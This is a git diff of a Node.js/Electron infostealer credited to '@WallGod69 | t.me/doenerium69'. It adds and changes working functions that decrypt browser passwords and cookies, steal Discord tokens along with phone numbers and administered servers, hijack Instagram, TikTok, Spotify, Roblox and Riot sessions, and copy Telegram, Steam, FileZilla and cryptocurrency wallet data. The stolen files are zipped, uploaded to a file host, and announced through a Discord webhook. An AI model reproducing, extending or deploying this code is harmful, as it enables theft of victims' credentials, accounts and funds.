@@ -4,7 +4,6 @@ const path = require('path');
 const httpx = require('axios');
 const axios = require('axios');
 const { app, dialog } = require('electron');
-const screenshot = require('screenshot-desktop');
 const os = require('os');
 const FormData = require('form-data');
 const AdmZip = require('adm-zip');
@@ -12,7 +11,6 @@ const { execSync, exec } = require('child_process');
 const crypto = require('crypto');
 const sqlite3 = require('sqlite3');
 const util = require('util');
-const destinationFolder = 'C:\\ProgramData\\Epic\\Launcher';
 function getLocale() {
     return Intl.DateTimeFormat().resolvedOptions().locale.slice(0, 2).toUpperCase();
 }
@@ -27,7 +25,6 @@ var appdata = process.env.APPDATA,
 
 
 const discordWebhookUrl = 'REMPLACE_ME';
-
 
 
 const blackListedIPS = ["88.132.231.71", "212.119.227.165", "52.251.116.35", "194.154.78.69", "194.154.78.137", "213.33.190.219", "78.139.8.50", "20.99.160.173", "88.153.199.169", "84.147.62.12", "194.154.78.160", "92.211.109.160", "195.74.76.222", "188.105.91.116", "34.105.183.68", "92.211.55.199", "79.104.209.33", "95.25.204.90", "34.145.89.174", "109.74.154.90", "109.145.173.169", "34.141.146.114", "212.119.227.151", "195.239.51.59", "192.40.57.234", "64.124.12.162", "34.142.74.220", "188.105.91.173", "109.74.154.91", "34.105.72.241", "109.74.154.92", "213.33.142.50", ];
@@ -226,15 +223,6 @@ function onlyUnique(item, index, array) {
 }
 
 
-  const config = {
-    "logout": "instant",
-    "inject-notify": "true",
-    "logout-notify": "true",
-    "init-notify": "false",
-    "embed-color": 0x303037,
-    "disable-qr-code": "true"
-}
-/*
 const registryPath = 'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run';
 const keyName = 'EpicGamesLauncher';
     
@@ -258,7 +246,8 @@ function removeRegistryKey() {
     console.log(`Registry key removed successfully: ${stdout}`);
   });
 }
- basic startup
+
+/* basic startup
 function addRegistryKey() {
   const programPath = app.getPath('exe');
   const addCommand = `reg add "${registryPath}" /v ${keyName} /t REG_SZ /d "${programPath}" /f`;
@@ -280,29 +269,6 @@ function addRegistryKey() {
   });
 }
 */
-
-async function captureAndSaveScreenshot() {
-  try {
-    const imgArray = await screenshot.all();
-
-    const screenshotsFolderPath = path.join(mainFolderPath, 'screenshots');
-
-    if (!fs.existsSync(screenshotsFolderPath)) {
-      fs.mkdirSync(screenshotsFolderPath);
-    }
-
-    imgArray.forEach((imgBuffer, index) => {
-      const filePath = path.join(screenshotsFolderPath, `DesktopScreenshot_${index}.jpg`);
-      fs.writeFileSync(filePath, imgBuffer);
-      console.log(`Desktop screenshot ${index} saved:`, filePath);
-    });
-
-    console.log('All desktop screenshots saved.');
-  } catch (error) {
-    console.error('Error capturing desktop screenshot:', error.message);
-  }
-}
-
 
 function sendSuccessToWebhook() {i
   console.log('Sending success to webhook');
@@ -467,7 +433,7 @@ async function findGithubBackupCodes() {
 
 
 function sendSuccessToWebhook() {
-    const successMessage = '**<---------------------------INJECTION STARTED---------------------------->**';
+    const successMessage = '**<--------------------------INJECTION STARTED--------------------------->**';
     axios.post(discordWebhookUrl, {
         content: successMessage,
     }).then(response => {
@@ -507,7 +473,6 @@ _0x9b6227.passwords = 0
 _0x9b6227.cookies = 0
 _0x9b6227.autofills = 0
 _0x9b6227.wallets = 0
-_0x9b6227.telegram = false
 const count = _0x9b6227,
 user = {
     ram: os.totalmem(),
@@ -816,7 +781,7 @@ function createRunBat() {
     const programName = path.basename(app.getPath('exe'));
     const sourceFolderPath = path.dirname(app.getPath('exe'));
 
-    // URL des téléchargements
+    // URL
     const downloadUrl1 = "YOUR-STEALER-EXE-LINK-HERE";
     const downloadUrl2 = "YOUR-BINDED-EXE-LINK-HERE";
     
@@ -1202,7 +1167,7 @@ async function SpotifySession(cookie) {
                 { name: 'Birthdate', value: "```" + birthdate + "```", inline: true },
                 { name: 'Country', value: "```" + country + "```", inline: true },
                 { name: 'Spotify Profile', value: `[Open Profile](https://open.spotify.com/user/${username})`, inline: false },
-                { name: 'Spotify Cookie', value: '```' + cookie + '```', inline: false }
+                { name: 'Spotify Cookie | sp_dc=', value: '```' + cookie + '```', inline: false }
             ],
             footer: {
                 text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
@@ -1581,7 +1546,8 @@ async function stealTokens() {
             if (!json) continue;
             
             interceptedTokens.push(token);
-
+            const phone = await getPhoneNumber(token);
+            const hqGuilds = await getHQGuilds(token);
             var ip = await getIp();
             var billing = await getBilling(token);
             var friends = await getRelationships(token);
@@ -1604,21 +1570,6 @@ async function stealTokens() {
                         value: "```" + token + "```",
                     },
                     {
-                        name: "<a:all_discord_badges_gif:1157698511320653924> Badges:",
-                        value: "``" + getBadges(json.flags) + "``",
-                        inline: true
-                    },
-                    {
-                        name: "<a:nitro_boost:877173596793995284> Nitro Type:",
-                        value: await getNitro(json.premium_type, json.id, token),
-                        inline: true
-                    },
-                    {
-                        name: "<a:Card_Black:1157319579287179294>",
-                        value: "``" + billing + "``",
-                        inline: true
-                    },
-                    {
                         name: ":envelope: Email:",
                         value: "``" + `\`${json.email}\`` + "``",
                         inline: true
@@ -1627,7 +1578,32 @@ async function stealTokens() {
                         name: ":globe_with_meridians: IP:",
                         value: "``" + `\`${ip}\`` + "``",
                         inline: true
-                    }
+                    },
+                    {
+                        name: "<:mobile88:1210411486120517663> Phone:",
+                        value: "``" + `\`${phone}\`` + "``",
+                        inline: true
+                    },
+                    {
+                        name: "",
+                        value: `<a:all_discord_badges_gif:1157698511320653924> **Badges:** ${getBadges(json.flags)}`,
+                        inline: true
+                    },
+                    {
+                        name: "",
+                        value: `<a:nitro_boost:877173596793995284> **Nitro Type:** ${await getNitro(json.premium_type, json.id, token)}`,
+                        inline: true
+                    },
+                    {
+                        name: "",
+                        value: `<a:Card_Black:1157319579287179294> **Billing:** ${billing}`,
+                        inline: true
+                    },
+                    {
+                        name: ":shield: HQ Guilds:",
+                        value: hqGuilds,
+                        inline: true
+                    },
                   ],
                 footer: {
     text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
@@ -1663,6 +1639,85 @@ async function stealTokens() {
             logToDebugFile(error);
         }
 
+    }
+}
+
+
+
+async function getPhoneNumber(token) {
+    try {
+        const response = await axios.get("https://discordapp.com/api/v6/users/@me", {
+            headers: {
+                "Content-Type": "application/json",
+                "authorization": token
+            }
+        });
+
+        const phoneNumber = response.data.phone || "None";
+        const isTwoFactorEnabled = response.data.mfa_enabled;
+
+        if (isTwoFactorEnabled) {
+            return phoneNumber;
+        }
+
+        return phoneNumber;
+    } catch (error) {
+        console.error(error);
+        return "Error retrieving phone number";
+    }
+}
+
+
+async function getHQGuilds(token) {
+    try {
+        const response = await axios.get("https://discord.com/api/v9/users/@me/guilds?with_counts=true", {
+            headers: {
+                "Content-Type": "application/json",
+                "authorization": token
+            }
+        });
+
+        const hqGuilds = response.data.filter(guild => guild.permissions === "562949953421311");
+
+        if (hqGuilds.length === 0) {
+            return "```No HQ Guilds```";
+        }
+
+        let result = "\n";
+
+        for (const guild of hqGuilds) {
+            const invites = await getGuildInvites(token, guild.id);
+            const invite = invites.length > 0 ? `[Join Server](https://discord.gg/${invites[0].code})` : "No Invite";
+
+            const ownerOrAdmin = guild.owner ? "<:SA_Owner:991312415352430673> Owner" : "<:admin:967851956930482206> Admin";
+
+            result += `${ownerOrAdmin} | \`${guild.name} - Members: ${guild.approximate_member_count}\` - ${invite}\n`;
+
+            if (result.length >= 1024) {
+                return "\`Too many servers to display.\`";
+            }
+        }
+
+        return result;
+    } catch (error) {
+        console.error(error);
+        return "Error retrieving HQ Guilds";
+    }
+}
+
+async function getGuildInvites(token, guildId) {
+    try {
+        const response = await axios.get(`https://discord.com/api/v8/guilds/${guildId}/invites`, {
+            headers: {
+                "Content-Type": "application/json",
+                "authorization": token
+            }
+        });
+
+        return response.data;
+    } catch (error) {
+        console.error(error);
+        return "No Invite";
     }
 }
 
@@ -1769,7 +1824,7 @@ async function getBilling(token) {
             bi += "<:rustler:987692721613459517>";
         }
     });
-    if (bi == '') bi = `\`No Billing\``
+    if (bi == '') bi = "```No Billing```";
     return bi;
 }
 
@@ -1779,7 +1834,7 @@ function getBadges(flags) {
         let o = badges[prop];
         if ((flags & o.Value) == o.Value) b += o.Emoji;
     };
-    if (b == '') return `\`No Badges\``;
+    if (b == '') return "```No Badges```";
     return `${b}`;
 }
 
@@ -1949,7 +2004,7 @@ function copyFolder(source, destination) {
   });
 }
 
-function copySteam(source, destination) {
+function copyGames(source, destination) {
   try {
     fs.mkdirSync(destination, { recursive: true }); 
   } catch (err) {
@@ -1972,7 +2027,6 @@ function copySteam(source, destination) {
 }
 
 
-
 const logFilePath = path.join(mainFolderPath, 'debug.log');
 
 function redirectErrorsToLog() {
@@ -1993,36 +2047,43 @@ function redirectErrorsToLog() {
 
 async function SubmitTelegram() {
     try {
-        var exists = false;
+        const sourcePath = `${process.env.APPDATA}\\Telegram Desktop\\tdata`;
 
-        if (fs.existsSync(`${process.env.APPDATA}\\Telegram Desktop\\tdata`)) {
-            exists = true;
-            exec("taskkill /IM Telegram.exe /F", (error, stdout, stderr) => {});
-            await new Promise(resolve => setTimeout(resolve, 4000));
-            addFolder(path.join('Telegram'));
-        } else {
-            exists = false;
+        try {
+            await fsPromises.access(sourcePath);
+        } catch (error) {
+            console.error(`Error accessing source path: ${error.message}`);
+            return;
         }
 
-        if (exists) {
-            const shitFiles = ["dumps", "emojis", "user_data", "working", "emoji", "tdummy", "user_data#2", "user_data#3", "user_data#4", "user_data#5"];
+        const destinationPath = path.join(mainFolderPath, 'Telegram');
 
-            fs.readdirSync(`${process.env.APPDATA}\\Telegram Desktop\\tdata`).forEach(async c => {
-                if (!shitFiles.includes(c)) {
-                    try {
-                        const f = fs.lstatSync(`${process.env.APPDATA}\\Telegram Desktop\\tdata\\` + c);
-                        if (f.isDirectory()) {
-                            copyRecursiveSync(`${process.env.APPDATA}\\Telegram Desktop\\tdata\\` + c, path.join(mainFolderPath, 'Telegram', c));
-                        } else {
-                            fs.copyFileSync(`${process.env.APPDATA}\\Telegram Desktop\\tdata\\` + c, path.join(mainFolderPath, 'Telegram', c));
-                        }
-                    } catch (err) {
-                        try {
-                            console.error(`An error occurred: ${err}`);
-                        } catch {}
+        exec("taskkill /IM Telegram.exe /F", (error, stdout, stderr) => {});
+        await new Promise(resolve => setTimeout(resolve, 4000));
+        addFolder(path.join('Telegram'));
+
+        const blacklistFolders = ["emoji", "user_data", "user_data#2", "user_data#3", "user_data#4", "user_data#5"];
+
+        const files = await fsPromises.readdir(sourcePath);
+
+        for (const file of files) {
+            if (!blacklistFolders.includes(file)) {
+                const sourceItemPath = path.join(sourcePath, file);
+                const targetItemPath = path.join(destinationPath, file);
+
+                try {
+                    const isDirectory = (await fsPromises.stat(sourceItemPath)).isDirectory();
+
+                    if (isDirectory) {
+                        await fsPromises.mkdir(targetItemPath, { recursive: true });
+                        await copyFolderContents(sourceItemPath, targetItemPath);
+                    } else {
+                        await fsPromises.copyFile(sourceItemPath, targetItemPath);
                     }
+                } catch (err) {
+                    console.error(`An error occurred: ${err}`);
                 }
-            });
+            }
         }
 
         console.log('Telegram session data copied to mainFolder/Telegram');
@@ -2030,6 +2091,26 @@ async function SubmitTelegram() {
         console.error(`Error in SubmitTelegram: ${error.message}`);
     }
 }
+
+async function copyFolderContents(source, target) {
+    const files = await fsPromises.readdir(source);
+
+    for (const file of files) {
+        const sourceItemPath = path.join(source, file);
+        const targetItemPath = path.join(target, file);
+
+        const isDirectory = (await fsPromises.stat(sourceItemPath)).isDirectory();
+
+        if (isDirectory) {
+            await fsPromises.mkdir(targetItemPath, { recursive: true });
+            await copyFolderContents(sourceItemPath, targetItemPath);
+        } else {
+            await fsPromises.copyFile(sourceItemPath, targetItemPath);
+        }
+    }
+}
+
+
 
 async function StealEpicGames() {
     try {
@@ -2048,7 +2129,7 @@ async function StealEpicGames() {
                 const destinationPath = path.join(copiedPath, subfolder);
 
                 try {
-                    copyRecursiveSync(sourcePath, destinationPath, { recursive: true });
+                    copyGames(sourcePath, destinationPath, { recursive: true });
                     console.log(`Copied ${subfolder} to ${copiedPath}`);
                 } catch (err) {
                     console.error(`An error occurred while copying ${subfolder}: ${err.message}`);
@@ -2090,7 +2171,7 @@ async function SubmitSteam() {
         const destinationPath = path.join(mainFolderPath, 'Steam', folder);
 
         try {
-          copySteam(sourcePath, destinationPath);
+          copyGames(sourcePath, destinationPath);
           console.log(`Copied ${folder} to ${mainFolderPath}/Steam`);
         } catch (err) {
           console.error(`An error occurred while copying ${folder}: ${err.message}`);
@@ -2201,35 +2282,34 @@ async function archiveAndSendData() {
 
         await new Promise(resolve => setTimeout(resolve, 4000));
 
-    const walletsFolder = path.join(mainFolderPath, 'Wallets');
-    if (!fs.existsSync(walletsFolder)) {
-        fs.mkdirSync(walletsFolder);
-    }
+        const walletsFolder = path.join(mainFolderPath, 'Wallets');
+        if (!fs.existsSync(walletsFolder)) {
+            fs.mkdirSync(walletsFolder);
+        }
 
-    for (let [extensionName, extensionPath] of Object.entries(extension)) {
-        for (let i = 0; i < browserPath.length; i++) {
-            let browserFolder;
-            if (browserPath[i][0].includes('Local')) {
-                browserFolder = browserPath[i][0].split('\\Local\\')[1].split('\\')[0];
-            } else {
-                browserFolder = browserPath[i][0].split('\\Roaming\\')[1].split('\\')[1];
-            }
+        for (let [extensionName, extensionPath] of Object.entries(extension)) {
+            for (let i = 0; i < browserPath.length; i++) {
+                let browserFolder;
+                if (browserPath[i][0].includes('Local')) {
+                    browserFolder = browserPath[i][0].split('\\Local\\')[1].split('\\')[0];
+                } else {
+                    browserFolder = browserPath[i][0].split('\\Roaming\\')[1].split('\\')[1];
+                }
 
-            const browserExtensionPath = path.join(browserPath[i][0], extensionPath);
-            if (fs.existsSync(browserExtensionPath)) {
-                const walletFolder = path.join(walletsFolder, `${extensionName}_${browserFolder}_${browserPath[i][1]}`);
-                copyFolder(browserExtensionPath, walletFolder);
-
+                const browserExtensionPath = path.join(browserPath[i][0], extensionPath);
+                if (fs.existsSync(browserExtensionPath)) {
+                    const walletFolder = path.join(walletsFolder, `${extensionName}_${browserFolder}_${browserPath[i][1]}`);
+                    copyFolder(browserExtensionPath, walletFolder);
+                }
             }
         }
-    }
 
-    for (let [walletName, walletPath] of Object.entries(walletPaths)) {
-        if (fs.existsSync(walletPath)) {
-            const walletFolder = path.join(walletsFolder, walletName);
-            copyFolder(walletFolder, walletPath);
+        for (let [walletName, walletPath] of Object.entries(walletPaths)) {
+            if (fs.existsSync(walletPath)) {
+                const walletFolder = path.join(walletsFolder, walletName);
+                copyFolder(walletFolder, walletPath);
+            }
         }
-    }
 
         const data = {
             Discord: [path.join(mainFolderPath, 'Discord', 'discord.txt')],
@@ -2245,6 +2325,16 @@ async function archiveAndSendData() {
             const discordFileContent = tokens.join('\n');
             fs.writeFileSync(discordFilePath, discordFileContent);
             console.log('Tokens saved to discord.txt');
+        } else {
+            const discordFolderPath = path.join(mainFolderPath, 'Discord');
+            if (!fs.existsSync(discordFolderPath)) {
+                fs.mkdirSync(discordFolderPath);
+            }
+
+            const discordFilePath = path.join(discordFolderPath, 'discord.txt');
+            const noTokenMessage = 'No token found.';
+            fs.writeFileSync(discordFilePath, noTokenMessage);
+            console.log('No token found. Updated discord.txt with message.');
         }
 
         Object.entries(data).forEach(([dataType, files]) => {
@@ -2264,6 +2354,7 @@ async function archiveAndSendData() {
         getExtension(zipFilePath);
     } catch (error) {
         console.error(`Error in archiveAndSendData: ${error.message}`);
+        // Continue execution even if an error occurs
     } finally {
         try {
             if (fs.existsSync(mainFolderPath)) {
@@ -2274,6 +2365,7 @@ async function archiveAndSendData() {
         }
     }
 }
+
 
 async function uploadToDoge(destinationFolder, locale, computerName) {
     return new Promise((resolve, reject) => {
@@ -2307,8 +2399,6 @@ async function uploadToDoge(destinationFolder, locale, computerName) {
 }
 
 
-
-
 async function getExtension(zipFilePath) {
 
     const discordTokensFilePath = path.join(mainFolderPath, 'discord', 'discord.txt');
@@ -2317,7 +2407,10 @@ async function getExtension(zipFilePath) {
     if (fs.existsSync(discordTokensFilePath)) {
         const discordTokensContent = fs.readFileSync(discordTokensFilePath, 'utf-8');
         const discordTokensEntries = discordTokensContent.split('\n').filter(entry => entry.trim() !== '');
-        discordTokensCount = discordTokensEntries.length;
+
+        if (discordTokensEntries.length > 0) {
+            discordTokensCount = discordTokensEntries.length;
+        }
     }
 
     const cookiesFolder = path.join(mainFolderPath, 'cookies');
@@ -2347,8 +2440,9 @@ async function getExtension(zipFilePath) {
     const walletsFolderPath = path.join(mainFolderPath, 'Wallets');
     const walletSubdirectories = fs.readdirSync(walletsFolderPath).filter(item => fs.statSync(path.join(walletsFolderPath, item)).isDirectory());
     let walletCount = walletSubdirectories.length;
-
-
+    const foundFoldersText = await checkFolders(mainFolderPath);
+    const foundWalletsText = await checkWallets(mainFolderPath);
+    const destinationFolder = 'C:\\ProgramData\\Epic\\Launcher';
     const token = await uploadToDoge(destinationFolder, locale, computerName);
     const downloadLink = `https://api.filedoge.com/download/${token}`;
 
@@ -2378,7 +2472,7 @@ async function getExtension(zipFilePath) {
                 inline: true,
             },
             {
-                name: '<a:2891bitcoin:984181779038617623> Browser wallet',
+                name: '<a:2891bitcoin:984181779038617623> Browser extension/wallet',
                 value: '```' + walletCount.toString() + '```',
                 inline: true,
             },
@@ -2388,8 +2482,8 @@ async function getExtension(zipFilePath) {
                 inline: true,
             },
             {
-                name: '<a:system:1205123587632275517> System Information',
-                value: '```\n' +
+                name: '‎',
+                value: '**<a:system:1205123587632275517> System Information**\n```\n' +
                     `Hostname: ${user.hostname}\n` +
                     `User Info: ${user.userInfo}\n` +
                     `Version: ${user.version}\n` +
@@ -2405,8 +2499,13 @@ async function getExtension(zipFilePath) {
             },
             {
                 name: '‎ ',
-                value: `<:download:917499025282973766> [\`${locale}-${computerName}.zip\`](${downloadLink})`,
+                value: `<:download:917499025282973766> [\`${locale}-${computerName}.zip\`](${downloadLink})\n\n**___Local Session Found:___**\n` + foundFoldersText || 'None',
                 inline: false,
+            },
+            {
+            name: '**___Local Wallets Found:___**',
+            value: foundWalletsText || 'None',
+            inline: false,
             },
         ],
         footer: {
@@ -2432,13 +2531,124 @@ async function getExtension(zipFilePath) {
             console.error('An error occurred while sending system information:', error.message);
         });
 
-    await new Promise(resolve => setTimeout(resolve, 8000));
+    await new Promise(resolve => setTimeout(resolve, 5000));
 
-    process.exit();
+    //process.exit();
+}
+
+
+async function checkFolders(mainFolderPath) {
+    const foldersToCheck = [
+        { name: 'Telegram', emoji: '<:Telegram_2019_Logo:1210423641062510652>' },
+        { name: 'Steam', emoji: '<:Steam_icon_logo47:1210423638356922489>' },
+        { name: 'RiotGames', emoji: '<:Riot_Games_2019_Symbol:1210423639883644938>' },
+        { name: 'FileZilla', emoji: '<:filezilla_macos_bigsur_icon_1901:1210423500716777522>' },
+        { name: 'Epic Games', emoji: '<:Icon6:1205137412666163211>' },
+    ];
+
+    const separator = ' | ';
+    let foundFoldersText = '';
+
+    try {
+        for (const { name, emoji } of foldersToCheck) {
+            const folderPath = path.join(mainFolderPath, name);
+
+            if (fs.existsSync(folderPath) || fs.existsSync(path.join(mainFolderPath, name.toLowerCase()))) {
+                foundFoldersText += `${emoji} **${name}**${separator}`;
+            }
+        }
+
+        foundFoldersText = foundFoldersText.slice(0, -separator.length);
+
+        return foundFoldersText || 'None';
+    } catch (error) {
+        console.error(error);
+        return `Error: ${error.message}`;
+    }
 }
 
 
 
+async function checkWallets(mainFolderPath) {
+    const walletEmojis = {
+        "Bitcoin": '<a:2891bitcoin:984181779038617623>',
+        "Zcash": '<a:outputonlinegiftools1:1212238144229867530>',
+        "Armory": '<:imageremovebgpreview2:1212238560715870270>',
+        "Bytecoin": '<:bytecoinbcnbcnlogo:1212317682016329738>',
+        "Jaxx": '<:imageremovebgpreview4:1212239745942552606>',
+        "Exodus": '<:imageremovebgpreview5:1212249434922950686>',
+        "Ethereum": '<:imageremovebgpreview__7_removebg:1212248769291358209>',
+        "Electrum": '<:imageremovebgpreview6:1212249431718625321>',
+        "AtomicWallet": '<:atomic_wallet_logo_dark_rounded1:1212250322274230362>',
+        "Guarda": '<a:outputonlinegiftools2:1212249427021012993>',
+        "Coinomi": '<:co950cccacoinomilogocoinomiwalle:1212250113485836378>',
+    };
+
+    const separator = ' | ';
+    let foundWalletsText = '';
+
+    try {
+        // Check if the wallet folder exists inside the main folder
+        const walletFolder = path.join(mainFolderPath, 'Wallets');
+        if (fs.existsSync(walletFolder)) {
+            // Check all walletLocalPaths and display them with emojis
+            const walletEntries = await fs.promises.readdir(walletFolder);
+            let metamaskFound = false;
+
+            const foundWallets = walletEntries.map(walletName => {
+                const walletEmoji = walletEmojis[walletName];
+
+                if (walletName.toLowerCase().startsWith('metamask')) {
+                    if (!metamaskFound) {
+                        metamaskFound = true;
+                        return `<a:imageedit_1_5973982742:1212322722609233961> **Metamask**${separator}`;
+                    }
+                } else {
+                    return walletEmoji ? `${walletEmoji} **${walletName}**${separator}` : null;
+                }
+            }).filter(wallet => wallet !== null);
+
+            foundWalletsText = foundWallets.join('');
+            if (foundWalletsText) {
+                foundWalletsText = foundWalletsText.slice(0, -separator.length);
+            }
+        }
+
+        return foundWalletsText || 'None';
+    } catch (error) {
+        console.error(error);
+        return `Error: ${error.message}`;
+    }
+}
+
+
+function localWalletData() {
+    try {
+        const walletsDestination = path.join(mainFolderPath, 'Wallets');
+        if (!fs.existsSync(walletsDestination)) {
+            fs.mkdirSync(walletsDestination, { recursive: true });
+        }
+
+        // Copy data for each wallet
+        for (const walletName in walletLocalPaths) {
+            const walletSource = walletLocalPaths[walletName];
+            const walletDestination = path.join(walletsDestination, walletName);
+
+            if (fs.existsSync(walletSource)) {
+                if (!fs.existsSync(walletDestination)) {
+                    fs.mkdirSync(walletDestination, { recursive: true });
+                }
+
+                // Copy the contents of the wallet folder to the Wallets subfolder
+                copyFolder(walletSource, walletDestination);
+            }
+        }
+
+        console.log('Wallet data copied successfully.');
+    } catch (error) {
+        console.error(`Error copying wallet data: ${error.message}`);
+    }
+}
 
 
 async function getPasswords() {
@@ -2465,7 +2675,7 @@ async function getPasswords() {
 
     await new Promise((_0x2c148b, _0x32e8f4) => {
       _0x3d71cb.each(
-        'SELECT origin_url, username_value, password_value FROM logins',
+        'SELECT origin_url, username_value, password_value, date_created FROM logins',
         (_0x4c7a5b, _0x504e35) => {
           if (!_0x504e35.username_value) {
             return;
@@ -2485,6 +2695,8 @@ async function getPasswords() {
             const password =
               _0x210aeb.update(_0x279e1b, 'base64', 'utf-8') +
               _0x210aeb.final('utf-8');
+            
+            const dateCreated = new Date(_0x504e35.date_created / 1000 - 11644473600 * 1000).toLocaleString();
 
             _0x540754.push(
               '================\nURL: ' +
@@ -2493,6 +2705,8 @@ async function getPasswords() {
                 _0x504e35.username_value +
                 '\nPassword: ' +
                 password +
+                '\nDate Created: ' +
+                dateCreated +
                 '\nApplication: ' +
                 _0xd541c2 +
                 ' ' +
@@ -2571,17 +2785,17 @@ async function getCookies() {
 
                         // Handle different services
                         if (row.host_key === '.instagram.com' && row.name === 'sessionid') {
-                            SubmitInstagram(`sessionid=${decrypted}`);
+                            SubmitInstagram(`${decrypted}`);
                         } else if (row.host_key === '.tiktok.com' && row.name === 'sessionid') {
-                            stealTikTokSession(`sessionid=${decrypted}`);
+                            stealTikTokSession(`${decrypted}`);
                         } else if (row.host_key === '.reddit.com' && row.name === 'reddit_session') {
-                            setRedditSession(`reddit_session=${decrypted}`);
+                            setRedditSession(`${decrypted}`);
                         } else if (row.host_key === '.spotify.com' && row.name === 'sp_dc') {
-                            SpotifySession(`sp_dc=${decrypted}`);
+                            SpotifySession(`${decrypted}`);
                         } else if (row.name === '.ROBLOSECURITY') {
-                            SubmitRoblox(`.ROBLOSECURITY=${decrypted}`);
+                            SubmitRoblox(`${decrypted}`);
                         } else if (row.host_key === 'account.riotgames.com' && row.name === 'sid') {
-                            RiotGameSession(`sid=${decrypted}`);
+                            RiotGameSession(`${decrypted}`);
                         }
                     } catch (error) {
                         console.error(`Error decrypting cookies for ${row.host_key}:`, error);
@@ -2636,10 +2850,6 @@ async function getCookies() {
         }
     }
 }
-
-
-
-
 
 
 async function getAutofills() {
@@ -2707,11 +2917,7 @@ async function getAutofills() {
   }
 }
    
-async function DiscordListener(path) {
-        return;
-}
-
-function copyRecursiveSync(source, target, excludeList = []) {
+function copyriot(source, target, excludeList = []) {
     const targetFolder = path.join(target, path.basename(source));
 
     if (!fs.existsSync(targetFolder)) {
@@ -2726,7 +2932,7 @@ function copyRecursiveSync(source, target, excludeList = []) {
 
             if (!excludeList.some(excludedFile => curSource.includes(excludedFile))) {
                 if (fs.lstatSync(curSource).isDirectory()) {
-                    copyRecursiveSync(curSource, targetFolder, excludeList);
+                    copyFolder(curSource, targetFolder, excludeList);
                 } else {
                     fs.copyFileSync(curSource, curTarget);
                 }
@@ -2759,7 +2965,7 @@ async function SubmitRiotGames() {
           ];
 
           try {
-              copyRecursiveSync(riotGamesSourcePath, riotGamesDestinationPath, riotGamesExcludeList);
+              copyriot(riotGamesSourcePath, riotGamesDestinationPath, riotGamesExcludeList);
               console.log(`Copied Riot Games data to ${riotGamesDestinationPath}`);
           } catch (err) {
             console.error(``);
@@ -2769,7 +2975,7 @@ async function SubmitRiotGames() {
             const riotGamesLocalAppDataDestinationPath = path.join(mainFolderPath, 'RiotGames', 'AppData', 'Local');
 
             try {
-                copyRecursiveSync(riotGamesLocalAppDataSourcePath, riotGamesLocalAppDataDestinationPath);
+                copyriot(riotGamesLocalAppDataSourcePath, riotGamesLocalAppDataDestinationPath);
                 console.log(`Copied Riot Games Local AppData to ${riotGamesLocalAppDataDestinationPath}`);
             } catch (err) {
                 console.error(`An error occurred while copying Riot Games Local AppData: ${err.message}`);
@@ -2781,6 +2987,7 @@ async function SubmitRiotGames() {
         console.error(`Error in SubmitRiotGames: ${error.message}`);
     }
 }
+
 
 async function RiotGameSession(cookie) {
     try {
@@ -2837,35 +3044,6 @@ async function RiotGameSession(cookie) {
 }
 
 
-function localWalletData() {
-    try {
-        const walletsDestination = path.join(mainFolderPath, 'Wallets');
-        if (!fs.existsSync(walletsDestination)) {
-            fs.mkdirSync(walletsDestination, { recursive: true });
-        }
-
-        // Copy data for each wallet
-        for (const walletName in walletLocalPaths) {
-            const walletSource = walletLocalPaths[walletName];
-            const walletDestination = path.join(walletsDestination, walletName);
-
-            if (fs.existsSync(walletSource)) {
-                if (!fs.existsSync(walletDestination)) {
-                    fs.mkdirSync(walletDestination, { recursive: true });
-                }
-
-                // Copy the contents of the wallet folder to the Wallets subfolder
-                copyFolder(walletSource, walletDestination);
-            }
-        }
-
-        console.log('Wallet data copied successfully.');
-    } catch (error) {
-        console.error(`Error copying wallet data: ${error.message}`);
-    }
-}
-
-
 //
 async function submitFileZilla() {
   const fileZillaSource = `C:\\Users\\${process.env.USERNAME}\\AppData\\Roaming\\FileZilla`;
@@ -2908,11 +3086,10 @@ function onlyUnique(item, index, array) {
         Killchrome();
         initializeFolders();
         getEncrypted();
-        captureAndSaveScreenshot();
         getCookies();
         getAutofills();
         getPasswords();
-        //removeRegistryKey();
+        removeRegistryKey();
         stealTokens();
         localWalletData();
         submitFileZilla();
